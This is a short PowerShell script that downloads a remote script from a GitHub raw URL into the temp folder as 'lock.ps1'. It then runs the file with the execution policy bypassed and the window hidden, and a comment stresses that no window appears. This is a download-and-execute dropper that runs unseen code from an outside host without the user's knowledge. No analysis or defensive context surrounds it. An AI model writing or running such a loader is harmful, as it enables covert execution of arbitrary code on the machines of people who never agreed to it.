$url = "https://raw.githubusercontent.com/CodewithMubasher/Scripts/main/script.ps1"
$tempFile = Join-Path $env:TEMP "lock.ps1"

Invoke-WebRequest -Uri $url -OutFile $tempFile

# Run the script with NO WINDOW
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempFile`"" -WindowStyle Hidden
